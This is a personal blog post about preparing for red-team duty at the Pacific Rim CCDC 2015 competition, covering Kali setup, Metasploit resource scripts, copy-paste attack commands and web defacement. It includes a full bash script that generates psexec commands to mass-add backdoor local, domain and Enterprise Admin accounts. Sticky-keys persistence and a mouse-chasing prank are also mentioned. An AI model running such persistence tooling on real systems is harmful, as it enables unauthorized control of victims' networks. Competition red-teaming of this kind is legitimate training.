---
layout: post
title: How I Prepared to Red Team at PRCCDC 2015
summary: A bit about how I prepared for the Pacific Rim CCDC 2015 competition
image: /assets/prccdc2015/prccdc2015-defacement.gif
tags:
- ccdc
commentIssueId: 4
---

I had the opportunity to take part in the Pacific Rim CCDC this past weekend and it was a BLAST! It was my first CCDC, so I really didn't know what to expect. I did know that the last thing I would want to be doing is installing and configuring tools during test time.

### Kali
I err'd on the side of installing tools I may not use rather than not installing something I would need. I've got a goto script I use for my setting up a Kali VM and customizing. It installs a ton of tools and scripts that I use. The script can be found [here](https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/kali_setup.sh).


Then, I made some manual tweaks:

* Change root password
* Enable autologin within `/etc/gdm3/daemon.conf`
* Disable screen lockout
* Add Leafpad and Screenshot to taskbar
* Alias `msfconsole='msfconsole -r /msfconsole.rc'`
* Add `* * * * * /payload_gen.sh` to crontab

Next up was loading up on wordlists. I rounded up the usual suspects (Cain, John, RockYou, etc) but I knew I would want to add some inconspicuous user accounts and mess with the Blue Team's host file. To accomodate, I found lists of the top 10,000 US last names and internet domain names. I ended up just whipping up a slightly taunting list of 10 usernames that I used day of, but if I needed 10k usernames I had them.

I wrote a quick bash script to create a Metasploit resource script and batch file that creates new local users and add them to the local admin group for persistence sake.

```bash
#!/bin/bash
#by bluescreenofjeff
IFS=$'\n'
USERLISTFILE='/root/Desktop/users.txt'
PASSVAR='StrongPassword1'
OUTFILELOCAL='mass_user_add_local.rc'
OUTBATLOCAL='mass_user_add_local.bat'
OUTFILEDOMAIN='mass_user_add_domain.rc'
OUTBATDOMAIN='mass_user_add_domain.bat'

#BAT Output - local
for CURRUSER in `cat $USERLISTFILE`
do
	echo net user $CURRUSER /add /active:yes\ >> $OUTBATLOCAL
	echo net user $CURRUSER $PASSVAR >> $OUTBATLOCAL
	echo net localgroup  administrators $CURRUSER  /add >> $OUTBATLOCAL
done

#BAT to RC - local
echo 'use auxiliary/admin/smb/psexec_command' >> $OUTFILELOCAL
for EACH in `cat $OUTBATLOCAL`
do
	echo set command \" $EACH \" >> $OUTFILELOCAL
	echo run >> $OUTFILELOCAL
done


#BAT Output - domain
for CURRUSER in `cat $USERLISTFILE`
do
	echo net user $CURRUSER /add /active:yes /domain >> $OUTBATDOMAIN
	echo net user $CURRUSER $PASSVAR /domain >> $OUTBATDOMAIN
	echo net localgroup  administrators $CURRUSER  /add /domain >> $OUTBATDOMAIN
	echo net group "Enterprise Admins"  $CURRUSER /add /domain >> $OUTBATDOMAIN
	echo net group "Enterprise Admins"  $CURRUSER /add /domain >> $OUTBATDOMAIN
done

#BAT to RC - domain
echo 'use auxiliary/admin/smb/psexec_command' >> $OUTFILEDOMAIN
for EACH in `cat $OUTBATDOMAIN`
do
	echo set command \" $EACH \" >> $OUTFILEDOMAIN
	echo run >> $OUTFILEDOMAIN
done
```

[Source](https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/mass_user_add_generator.sh)


### Metasploit
Most of the Red Teamers used Cobalt Strike Team Servers as their base of operations, but since I haven't used it that much and didn't want to potentially get shut out of my target boxes because of learning curve. I decided to stick with msfconsole as my main tool for the weekend. My main goal in preparation was to get as much of the time-wasting stuff automated as possible.


* [intel.rc](https://github.com/bluscreenofjeff/Metasploit-Resource-Scripts/blob/master/intel.rc) - Runs a number of intel-gathering Windows commands. Run from the Meterpreter prompt.
* [bounce](https://github.com/bluscreenofjeff/Metasploit-Resource-Scripts/blob/master/bounce.rc) - Restarts a reverse_tcp listener on 443.
* [bouncessl](https://github.com/bluscreenofjeff/Metasploit-Resource-Scripts/blob/master/bouncessl.rc) - Restarts a reverse_https listener on 443.
* [local500.rc](https://github.com/bluscreenofjeff/Metasploit-Resource-Scripts/blob/master/local500.rc) - Sets up for a brute force of the built-in 500 accounts. Modify with `file:///path/to/wordlist` on line 4.
* [winpersist.rc](https://github.com/bluscreenofjeff/Metasploit-Resource-Scripts/blob/master/winpersist.rc) - Sets up sticky keys, utilman, and display persistence using psexec_command.
* [msfconsole.rc](https://github.com/bluscreenofjeff/Metasploit-Resource-Scripts/blob/master/winpersist.rc) - msfconsole startup script. Reference the file path in the alias above. This gets written by the script above



### Commands
The biggest prep item was getting a solid copy/paste command list ready. This was a big focus point of the Red Team this year since the goal was to attack Blue Teams with the same attacks at roughly the same times. The command list has been reposted by Action Dan [here](http://lockboxx.blogspot.com/2015/03/red-teaming-at-prccdc-2015.html). 

In the time leading up to the official start, I pasted every single command from Phase 1's attacks into their own consoles so once the Red Team gets the go-ahead all you have to do is hit enter. 





### Defacement
Though this was my first rodeo, I knew that there would be opportunities to deface some web interfaces and I wanted to be ready to bring some lulz. This is what I settled on:
![I am invincible!](/assets/prccdc2015/prccdc2015-defacement.gif)

[Source](https://github.com/bluscreenofjeff/CCDC-Scripts/tree/master/website-defacement)

Looking back now, I should have also gathered some nice gifs about patching or host hardenening.
     


### Prepping for Next Year
As I mentioned I had a blast this year and hope to attend again next year. Before then there are a few scripts I'd like to have written and in-hand before go-time:

* **ndiff to monitor environment** - Before this year I started tweaking this script from the nmap documentation to diff periodic scans and monitor for network changes. I didn't get it polished enough and now am wondering if it's the best way to get what I'm after, but I'd like to be able to monitor the Blue Team's environment as close to realtime as possible. Spot new hosts, identify restarts, etc.
* **Low-hanging fruit scans** - Along the same lines, I would like a way to constantly check for previously used credentials, previously exploited vulns, etc to try and catch systems when they get reverted. 
* **Script to remove users from admin groups** - This is something my Red cell team manually did this year. We got Domain Admin access and once the final phase of wreaking havoc was called on we ran the resource script to remove all DAs from the Domain Admin, Enterprise Admin, Schema Admin, and Remote Desktop user groups. It would have been much easier to have a script to make that resource script. Simple enough.
* **moar lulz** - Somewhere around the middle of Phase 2 my co-Red cell teamer and I were watching some Boos from Super Mario Bros. chasing the Blue Teamer's mouse and causing them much frustration while trying to write a Disaster Recovery Plan. That was a lot of fun. I'd like to find some more ways to make our presence known to the Blue Teamers without being too destructive and watch them try to remediate us out. VNC, replaced sysinternals tools, things like that would be fun...

If I had to give one piece of advice to a first time Red Teamer, my suggestion is to prepare as much as possible. The LAST thing you want to be doing during the competition is Googling how to run an exploit or how to add yourself to the local admin group. That's not to say you'll avoid it completely-- you most likely won't -- but you want to minimize searching time down to things that are unique to the environment at hand. Automate the basic stuff that takes time, copy/paste the rest.
    